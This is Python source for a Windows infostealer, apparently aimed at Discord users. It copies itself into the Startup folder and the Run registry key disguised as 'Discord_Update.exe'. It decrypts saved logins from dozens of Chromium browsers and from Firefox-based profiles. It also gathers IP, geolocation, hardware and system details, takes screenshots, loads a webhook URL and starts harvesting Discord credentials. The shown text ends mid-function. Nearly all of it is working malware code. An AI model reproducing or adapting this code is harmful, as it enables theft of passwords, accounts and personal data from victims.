from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir, getenv
from json import loads, load
import json
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os, platform, psutil, socket, uuid, sqlite3
from datetime import datetime
import io
import base64
import shutil
import sys
import winreg
try:
    import PIL.ImageGrab
    from PIL import Image
    SCREENSHOT_ENABLED = True
except:
    SCREENSHOT_ENABLED = False

try:
    import ctypes
    from ctypes import c_uint, c_void_p, c_char_p, Structure, POINTER, cast, byref, create_string_buffer, string_at
    FIREFOX_SUPPORTED = True
except:
    FIREFOX_SUPPORTED = False

tokens = []
cleaned = []
checker = []

if FIREFOX_SUPPORTED:
    try:
        class NSSItem(Structure):
            _fields_ = [('type', c_uint), ('data', c_void_p), ('len', c_uint)]

        class SECItem(Structure):
            _fields_ = [('type', c_uint), ('data', c_void_p), ('len', c_uint)]

        class PK11SlotInfo(Structure):
            _fields_ = [('dummy', c_uint)]
    except:
        FIREFOX_SUPPORTED = False

def add_to_startup():
    try:
        exe_path = sys.executable
        
        if not exe_path.endswith('.exe'):
            return False
            
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
            
        target_path = os.path.join(startup_folder, 'Discord_Update.exe')
        
        if not os.path.exists(target_path) or not files_are_same(exe_path, target_path):
            shutil.copy2(exe_path, target_path)
            
        key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'Discord_Update', 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
        except Exception as e:
            print(f"Registry error: {str(e)}")
            
        return True
    except Exception as e:
        print(f"Error adding to startup: {str(e)}")
        return False

def files_are_same(file1, file2):
    try:
        stat1 = os.stat(file1)
        stat2 = os.stat(file2)
        
        return stat1.st_size == stat2.st_size and abs(stat1.st_mtime - stat2.st_mtime) < 10
    except:
        return False

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def get_firefox_profiles(profile_path):
    """Sucht nach Firefox-Profilen im angegebenen Profilverzeichnis"""
    profiles = []
    if not os.path.exists(profile_path):
        return profiles
        
    profiles_ini = os.path.join(profile_path, 'profiles.ini')
    if os.path.exists(profiles_ini):
        profile_folders = []
        try:
            with open(profiles_ini, 'r', encoding='utf-8') as f:
                content = f.read()
                for line in content.splitlines():
                    if line.startswith('Path='):
                        path = line.split('=')[1].strip()
                        if '/' in path:
                            path = path.replace('/', '\\')
                        profile_folders.append(path)
        except:
            pass
            
        for folder in profile_folders:
            full_path = os.path.join(profile_path, folder)
            if os.path.exists(full_path):
                profiles.append(full_path)
    
    if not profiles:
        for item in os.listdir(profile_path):
            if item.endswith('.default') or item.endswith('.normal'):
                full_path = os.path.join(profile_path, item)
                if os.path.isdir(full_path) and os.path.exists(os.path.join(full_path, 'logins.json')):
                    profiles.append(full_path)
                    
    return profiles

def init_nss_for_firefox(firefox_dir, profile_path):
    """Initialisiert die NSS-Bibliothek für Firefox-Passwortentschlüsselung"""
    if not FIREFOX_SUPPORTED:
        return None
        
    try:
        nss_paths = [
            os.path.join(firefox_dir, 'nss3.dll'),
            os.path.join(firefox_dir, 'softokn3.dll'),
            os.path.join(firefox_dir, 'freebl3.dll'),
        ]
        
        if not all(os.path.exists(path) for path in nss_paths):
            return None
            
        nss = ctypes.CDLL(os.path.join(firefox_dir, 'nss3.dll'))

        nss.PK11_GetInternalKeySlot.restype = c_void_p
        nss.PK11_CheckUserPassword.argtypes = [c_void_p, c_char_p]
        nss.PK11_CheckUserPassword.restype = c_uint
        nss.PK11_FreeSlot.argtypes = [c_void_p]
        nss.PK11_FreeSlot.restype = None
        nss.NSS_Init.argtypes = [c_char_p]
        nss.NSS_Shutdown.restype = None
        nss.PK11SDR_Decrypt.argtypes = [POINTER(SECItem), POINTER(SECItem), c_void_p]
        nss.PK11SDR_Decrypt.restype = c_uint
        
        if nss.NSS_Init(create_string_buffer(profile_path.encode())) != 0:
            return None
            
        slot = nss.PK11_GetInternalKeySlot()
        if slot is None:
            nss.NSS_Shutdown()
            return None
            
        if nss.PK11_CheckUserPassword(slot, create_string_buffer(b'')) != 0:
            nss.PK11_FreeSlot(slot)
            nss.NSS_Shutdown()
            return None
            
        return nss
    except Exception as e:
        print(f"Error initializing NSS for Firefox: {str(e)}")
        return None

def decrypt_firefox_passwords(firefox_dir, profile_path):
    """Entschlüsselt Firefox-Passwörter aus einem Profil"""
    if not FIREFOX_SUPPORTED:
        return []
        
    passwords = []
    
    try:
        nss = init_nss_for_firefox(firefox_dir, profile_path)
        if nss is None:
            print(f"Failed to initialize NSS for profile {profile_path}")
            return []
            
        try:
            logins_path = os.path.join(profile_path, 'logins.json')
            if not os.path.exists(logins_path):
                alt_paths = [
                    os.path.join(profile_path, 'signons.sqlite'),
                    os.path.join(profile_path, 'signons.json'),
                    os.path.join(profile_path, 'logins.sqlite')
                ]
                
                for alt_path in alt_paths:
                    if os.path.exists(alt_path):
                        logins_path = alt_path
                        break
                else:
                    return []
                
            if logins_path.endswith('.json'):
                with open(logins_path, 'r', encoding='utf-8') as f:
                    try:
                        logins_data = json.load(f)
                    except json.JSONDecodeError:
                        print(f"Invalid JSON in {logins_path}")
                        return []
                        
                success_count = 0
                failed_count = 0
                
                for login in logins_data.get('logins', []):
                    try:
                        username_enc = base64.b64decode(login.get('encryptedUsername', ''))
                        password_enc = base64.b64decode(login.get('encryptedPassword', ''))
                        
                        if not username_enc or not password_enc:
                            continue
                            
                        username = ""
                        password = ""
                        
                        input_item = SECItem()
                        input_item.data = cast(create_string_buffer(username_enc), c_void_p)
                        input_item.len = len(username_enc)
                        
                        output_item = SECItem()
                        output_item.data = None
                        output_item.len = 0
                        
                        if nss.PK11SDR_Decrypt(byref(input_item), byref(output_item), None) == 0:
                            username = string_at(output_item.data, output_item.len).decode()
                            

                        input_item = SECItem()
                        input_item.data = cast(create_string_buffer(password_enc), c_void_p)
                        input_item.len = len(password_enc)
                        
                        output_item = SECItem()
                        output_item.data = None
                        output_item.len = 0
                        
                        if nss.PK11SDR_Decrypt(byref(input_item), byref(output_item), None) == 0:
                            password = string_at(output_item.data, output_item.len).decode()
                            
                        if username and password:
                            success_count += 1
                            host = login.get('hostname', '')
                            passwords.append({
                                'url': host,
                                'username': username,
                                'password': password
                            })
                        else:
                            failed_count += 1
                            host = login.get('hostname', '')
                            if host and username:
                                passwords.append({
                                    'url': host,
                                    'username': username,
                                    'password': "Failed to decrypt"
                                })
                    except Exception as e:
                        failed_count += 1
                        print(f"Error decrypting Firefox login: {str(e)}")
                        
                if success_count > 0:
                    print(f"Successfully decrypted {success_count} Firefox passwords ({failed_count} failed)")
            
            elif logins_path.endswith('.sqlite'):
                try:
                    temp_db = os.path.join(os.getenv("TEMP"), f"firefox_logins_{os.path.basename(profile_path)}.db")
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                        
                    shutil.copy2(logins_path, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    query_templates = [
                        "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins",
                        "SELECT hostname, formSubmitURL, httpRealm, usernameField, passwordField, encryptedUsername, encryptedPassword FROM moz_logins",
                        "SELECT hostname, username, password FROM moz_logins",
                    ]
                    
                    for query in query_templates:
                        try:
                            cursor.execute(query)
                            login_data = cursor.fetchall()
                            
                            if "encryptedUsername" in query:
                                pass
                            else:
                                for row in login_data:
                                    if len(row) >= 3:
                                        url = row[0]
                                        username = row[1]
                                        password = row[2]
                                        
                                        if url and username and password:
                                            passwords.append({
                                                'url': url,
                                                'username': username,
                                                'password': password
                                            })
                                            
                            break  
                            
                        except sqlite3.OperationalError:
                            continue
                            
                    cursor.close()
                    conn.close()
                    
                    try:
                        os.remove(temp_db)
                    except:
                        pass
                        
                except Exception as e:
                    print(f"Error reading Firefox SQLite database: {str(e)}")
                    
        finally:
            nss.NSS_Shutdown()
            
        return passwords
    except Exception as e:
        print(f"Error processing Firefox passwords: {str(e)}")
        return []

def get_firefox_passwords():
    """Sammelt Passwörter aus Firefox und Firefox-basierten Browsern"""
    all_passwords = []
    
    firefox_installations = {
        "Firefox": os.path.join(os.getenv("PROGRAMFILES"), "Mozilla Firefox"),
        "Firefox (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Mozilla Firefox"),
        "Firefox Developer": os.path.join(os.getenv("PROGRAMFILES"), "Firefox Developer Edition"),
        "Firefox Developer (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Firefox Developer Edition"),
        "Firefox Nightly": os.path.join(os.getenv("PROGRAMFILES"), "Firefox Nightly"),
        "Firefox Nightly (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Firefox Nightly")
    }
    
    profile_locations = {
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
        "Firefox Developer": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Developer Edition", "Profiles"),
        "Firefox Nightly": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Nightly", "Profiles"),
        "Waterfox": os.path.join(os.getenv("APPDATA"), "Waterfox", "Profiles"),
        "Pale Moon": os.path.join(os.getenv("APPDATA"), "Moonchild Productions", "Pale Moon", "Profiles"),
        "SeaMonkey": os.path.join(os.getenv("APPDATA"), "Mozilla", "SeaMonkey", "Profiles"),
        "Thunderbird": os.path.join(os.getenv("APPDATA"), "Thunderbird", "Profiles"),
        "Basilisk": os.path.join(os.getenv("APPDATA"), "Basilisk", "Profiles"),
        "LibreWolf": os.path.join(os.getenv("APPDATA"), "LibreWolf", "Profiles")
    }
    
    firefox_dir = None
    for name, path in firefox_installations.items():
        if os.path.exists(path) and os.path.exists(os.path.join(path, 'nss3.dll')):
            firefox_dir = path
            break
            
    if not firefox_dir:
        return [] 
        
    for browser_name, profile_location in profile_locations.items():
        if not os.path.exists(profile_location):
            continue
            
        profiles = get_firefox_profiles(profile_location)
        
        for profile_path in profiles:
            try:
                profile_passwords = decrypt_firefox_passwords(firefox_dir, profile_path)
                
                for pwd in profile_passwords:
                    pwd['browser'] = browser_name
                    
                all_passwords.extend(profile_passwords)
            except Exception as e:
                print(f"Error processing {browser_name} profile at {profile_path}: {str(e)}")
                
    return all_passwords

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip

def get_geolocation(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        if response.status_code == 200:
            data = response.json()
            return {
                "country": data.get("country", "Unknown"),
                "region": data.get("regionName", "Unknown"),
                "city": data.get("city", "Unknown"),
                "isp": data.get("isp", "Unknown"),
                "lat": data.get("lat", "Unknown"),
                "lon": data.get("lon", "Unknown"),
                "timezone": data.get("timezone", "Unknown"),
                "zip": data.get("zip", "Unknown")
            }
    except:
        pass
    return {
        "country": "Unknown",
        "region": "Unknown",
        "city": "Unknown",
        "isp": "Unknown",
        "lat": "Unknown",
        "lon": "Unknown",
        "timezone": "Unknown",
        "zip": "Unknown"
    }

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def get_system_info():
    try:
        sys_info = {
            "os": platform.system(),
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "hostname": socket.gethostname(),
            "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]),
            "ram_total": f"{round(psutil.virtual_memory().total / (1024.0 **3), 2)} GB",
            "ram_used": f"{round(psutil.virtual_memory().used / (1024.0 **3), 2)} GB",
            "disk_total": f"{round(psutil.disk_usage('/').total / (1024.0 **3), 2)} GB",
            "disk_free": f"{round(psutil.disk_usage('/').free / (1024.0 **3), 2)} GB",
            "cpu_usage": f"{psutil.cpu_percent()}%",
            "battery": "N/A"
        }
        
        if hasattr(psutil, "sensors_battery") and psutil.sensors_battery():
            battery = psutil.sensors_battery()
            sys_info["battery"] = f"{battery.percent}% {'(Charging)' if battery.power_plugged else '(Discharging)'}"
        
        return sys_info
    except:
        return {"error": "Could not retrieve system information"}

def get_installed_browsers():
    browsers = []
    browser_paths = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome"),
        "Chrome Beta": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Beta"),
        "Chrome Dev": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Dev"),
        "Chrome SxS": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS"),
        
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge"),
        "Edge Beta": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta"),
        "Edge Dev": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev"),
        "Edge Canary": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Canary"),
        
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser"),
        "Brave Beta": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Beta"),
        "Brave Nightly": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Nightly"),
        
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
        "Opera Neon": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Neon"),
        "Opera Beta": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Beta"),
        "Opera Developer": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Developer"),
        
        "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi"),
        "Vivaldi Snapshot": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi Snapshot"),
        
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox"),
        "Firefox Developer": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Developer Edition"),
        "Firefox Nightly": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Nightly"),
        "Seamonkey": os.path.join(os.getenv("APPDATA"), "Mozilla", "SeaMonkey", "Profiles"),
        
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser"),
        
        "Chromium": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium"),
        "Comodo Dragon": os.path.join(os.getenv("LOCALAPPDATA"), "Comodo", "Dragon"),
        "Epic Privacy Browser": os.path.join(os.getenv("LOCALAPPDATA"), "Epic Privacy Browser"),
        "Amigo": os.path.join(os.getenv("LOCALAPPDATA"), "Amigo"),
        "Torch": os.path.join(os.getenv("LOCALAPPDATA"), "Torch"),
        "CentBrowser": os.path.join(os.getenv("LOCALAPPDATA"), "CentBrowser"),
        "7Star": os.path.join(os.getenv("LOCALAPPDATA"), "7Star", "7Star"),
        "Sputnik": os.path.join(os.getenv("LOCALAPPDATA"), "Sputnik", "Sputnik"),
        "Kometa": os.path.join(os.getenv("LOCALAPPDATA"), "Kometa"),
        "Orbitum": os.path.join(os.getenv("LOCALAPPDATA"), "Orbitum"),
        "Iridium": os.path.join(os.getenv("LOCALAPPDATA"), "Iridium"),
        "Uran": os.path.join(os.getenv("LOCALAPPDATA"), "uCozMedia", "Uran"),
        "Maxthon": os.path.join(os.getenv("LOCALAPPDATA"), "Maxthon", "Application"),
        "Slimjet": os.path.join(os.getenv("LOCALAPPDATA"), "Slimjet"),
        "Avast Secure Browser": os.path.join(os.getenv("LOCALAPPDATA"), "AVAST Software", "Browser"),
        "AVG Browser": os.path.join(os.getenv("LOCALAPPDATA"), "AVG", "Browser"),
        "Chedot": os.path.join(os.getenv("LOCALAPPDATA"), "Chedot"),
        "Blisk": os.path.join(os.getenv("LOCALAPPDATA"), "Blisk"),
        "Kinza": os.path.join(os.getenv("LOCALAPPDATA"), "Kinza"),
        "Coccoc": os.path.join(os.getenv("LOCALAPPDATA"), "CocCoc", "Browser"),
        "Atom": os.path.join(os.getenv("LOCALAPPDATA"), "Atom")
    }
    
    for browser, path in browser_paths.items():
        if os.path.exists(path):
            browsers.append(browser)
    
    return browsers

def decrypt_password(password, key):
    try:
        if not password or len(password) < 15:
            return "Failed to decrypt"
            
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(password)[:-16].decode()
            if decrypted_pass:
                return decrypted_pass
        except Exception as e:
            pass
            
        try:
            result = CryptUnprotectData(password, None, None, None, 0)
            if result and result[1]:
                return result[1].decode() if isinstance(result[1], bytes) else str(result[1])
        except Exception as e:
            pass
            
        try:
            if isinstance(password, bytes) and len(password) > 20:
                printable_chars = ''.join(chr(c) for c in password if 32 <= c <= 126)
                if len(printable_chars) > 4:
                    return f"Partially recovered: {printable_chars}"
        except:
            pass
            
        return "Failed to decrypt"
    except Exception as e:
        return f"Error: {str(e)[:20]}"

def get_browser_passwords():
    passwords = []
    browser_data = {
        "Chrome": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Chrome Profile 1": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
            "login_db": "\\Profile 1\\Login Data"
        },
        "Chrome Profile 2": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
            "login_db": "\\Profile 2\\Login Data"
        },
        "Chrome Profile 3": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
            "login_db": "\\Profile 3\\Login Data"
        },
        "Chrome Beta": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Beta", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Chrome SxS (Canary)": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Chrome Dev": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Dev", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        
        "Edge": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Edge Profile 1": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
            "login_db": "\\Profile 1\\Login Data"
        },
        "Edge Profile 2": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
            "login_db": "\\Profile 2\\Login Data"
        },
        "Edge Beta": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Edge Dev": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Edge Canary": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Canary", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        
        "Brave": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Brave Profile 1": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
            "login_db": "\\Profile 1\\Login Data"
        },
        "Brave Profile 2": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
            "login_db": "\\Profile 2\\Login Data"
        },
        "Brave Beta": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Beta", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Brave Nightly": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Nightly", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        
        "Opera": {
            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
            "login_db": "\\Login Data"
        },
        "Opera GX": {
            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
            "login_db": "\\Login Data"
        },
        "Opera Neon": {
            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Neon", "User Data", "Default"),
            "login_db": "\\Login Data"
        },
        "Opera Beta": {
            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Beta"),
            "login_db": "\\Login Data"
        },
        "Opera Developer": {
            "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Developer"),
            "login_db": "\\Login Data"
        },
        
        "Vivaldi": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Vivaldi Profile 1": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
            "login_db": "\\Profile 1\\Login Data"
        },
        "Vivaldi Snapshot": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi Snapshot", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        
        # Yandex
        "Yandex": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Yandex Profile 1": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
            "login_db": "\\Profile 1\\Login Data"
        },
        
        "Chromium": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Comodo Dragon": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Comodo", "Dragon", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Epic Privacy Browser": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Amigo": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Amigo", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Torch": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Torch", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "CentBrowser": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "CentBrowser", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "7Star": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "7Star", "7Star", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Sputnik": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Sputnik", "Sputnik", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Kometa": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Kometa", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Orbitum": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Orbitum", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Iridium": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Iridium", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Uran": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "uCozMedia", "Uran", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Maxthon": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Maxthon", "Application", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Slimjet": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Slimjet", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Avast Secure Browser": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "AVAST Software", "Browser", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "AVG Browser": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "AVG", "Browser", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Chedot": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Chedot", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Blisk": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Blisk", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Kinza": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Kinza", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Coccoc": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Atom": {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Atom", "User Data"),
            "login_db": "\\Default\\Login Data"
        },
        "Seamonkey": {
            "profile_path": os.path.join(os.getenv("APPDATA"), "Mozilla", "SeaMonkey", "Profiles"),
            "login_db": "\\signons.sqlite"
        }
    }
    
    for i in range(4, 10):
        browser_data[f"Chrome Profile {i}"] = {
            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
            "login_db": f"\\Profile {i}\\Login Data"
        }
    
    for browser, data in browser_data.items():
        try:
            profile_path = data["profile_path"]
            login_db = data["login_db"]
            
            if not os.path.exists(profile_path):
                continue
                
            if "signons.sqlite" in login_db:
                continue
                
            full_login_db_path = os.path.join(profile_path + login_db)
            if not os.path.exists(full_login_db_path):
                continue
                
            state_file = os.path.join(profile_path, "Local State")
            if not os.path.exists(state_file):
                continue
                
            with open(state_file, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            
            temp_db = os.path.join(os.getenv("TEMP"), f"{browser.replace(' ', '_')}_login_data.db")
            if os.path.exists(temp_db):
                os.remove(temp_db)
            
            with open(full_login_db_path, "rb") as login_data_file:
                with open(temp_db, "wb") as temp_file:
                    temp_file.write(login_data_file.read())
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            try:
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                login_data = cursor.fetchall()
                
                success_count = 0
                failed_count = 0
                
                for url, username, password in login_data:
                    if not url or not username or not password:
                        continue
                    
                    try:
                        decrypted_password = decrypt_password(password, master_key)
                        
                        if url and username and decrypted_password:
                            if decrypted_password != "Failed to decrypt":
                                success_count += 1
                            else:
                                failed_count += 1
                                
                            passwords.append({
                                "browser": browser,
                                "url": url,
                                "username": username,
                                "password": decrypted_password
                            })
                    except Exception as e:
                        failed_count += 1
                        print(f"Error decrypting password from {browser}: {str(e)}")
                        passwords.append({
                            "browser": browser,
                            "url": url,
                            "username": username,
                            "password": f"Error: {str(e)[:30]}"
                        })
                
                if success_count > 0:
                    print(f"Successfully decrypted {success_count} passwords from {browser} ({failed_count} failed)")
                elif failed_count > 0:
                    print(f"Failed to decrypt all {failed_count} passwords from {browser}")
                    
            except Exception as e:
                print(f"Error executing SQL query in {browser}: {str(e)}")
                
            cursor.close()
            conn.close()
            
            try:
                os.remove(temp_db)
            except:
                pass
                
        except Exception as e:
            print(f"Error processing {browser}: {str(e)}")
    
    if FIREFOX_SUPPORTED:
        firefox_passwords = get_firefox_passwords()
        passwords.extend(firefox_passwords)
    
    return passwords

def take_screenshot():
    if not SCREENSHOT_ENABLED:
        return []
    
    screenshots = []
    try:
        monitors = PIL.ImageGrab.getdisplays() if hasattr(PIL.ImageGrab, 'getdisplays') else [0]
        
        for i, monitor in enumerate(monitors):
            if hasattr(PIL.ImageGrab, 'grab') and len(monitors) > 1:
                screenshot = PIL.ImageGrab.grab(all_screens=True) if i == 0 else PIL.ImageGrab.grab(device=monitor)
            else:
                screenshot = PIL.ImageGrab.grab()
            
            max_width = 1280
            if screenshot.width > max_width:
                ratio = max_width / screenshot.width
                new_height = int(screenshot.height * ratio)
                screenshot = screenshot.resize((max_width, new_height), Image.LANCZOS)
            
            # Convert to bytes
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG', optimize=True, quality=85)
            img_byte_arr.seek(0)
            
            # Encode as base64
            img_base64 = base64.b64encode(img_byte_arr.read()).decode('utf-8')
            screenshots.append(img_base64)
    except Exception as e:
        print(f"Screenshot error: {e}")
    
    return screenshots

def get_webhook_url():
    storage_path = os.path.join(os.getenv('APPDATA'), 'gruppe_storage')
    config_path = os.path.join(storage_path, 'config.json')
    
    if not os.path.exists(config_path):
        return None
    
    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)
            webhook_url = config.get('webhook')
            if webhook_url:
                return webhook_url
    except Exception:
        pass
    
    return None

def get_discord_password():
    """Versucht, Discord-Passwörter aus den lokalen Dateien zu extrahieren"""
    passwords = []
    roaming = os.getenv('APPDATA')
    
    discord_paths = {
